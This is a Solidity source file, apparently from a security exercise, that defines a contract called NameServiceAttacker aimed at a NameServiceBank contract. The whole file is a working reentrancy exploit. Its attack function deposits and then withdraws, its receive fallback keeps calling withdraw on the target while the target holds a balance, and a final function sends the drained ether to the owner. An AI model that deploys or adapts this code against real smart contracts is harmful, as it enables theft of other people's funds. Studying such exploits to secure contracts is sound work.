pragma solidity 0.7.0;

import "./NameServiceBank.sol";

contract NameServiceAttacker {
    NAME_SERVICE_BANK public target;
    address payable public owner;

    constructor(NAME_SERVICE_BANK _target) {
        target = _target;
        owner = msg.sender;
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }

    function attack(uint256 amount) external {
        require(msg.sender == owner, "Only Owner");
        target.deposit{value: amount}();
        target.withdraw(amount);
    }

    function withdraw() external {
        require(msg.sender == owner, "Only Owner");
        owner.transfer(address(this).balance);
    }
}
